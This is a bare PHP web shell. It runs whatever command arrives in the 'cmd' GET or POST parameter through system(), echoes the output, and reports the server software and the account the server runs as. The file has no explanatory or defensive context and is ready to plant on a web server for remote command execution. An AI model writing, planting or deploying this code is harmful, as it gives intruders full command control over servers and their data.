<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd'] . " 2>&1");
    echo "</pre>";
}
if(isset($_POST['cmd'])) {
    echo "<pre>";
    system($_POST['cmd'] . " 2>&1");
    echo "</pre>";
}
// Show server info
echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
echo "User: ";
system("whoami");
?>
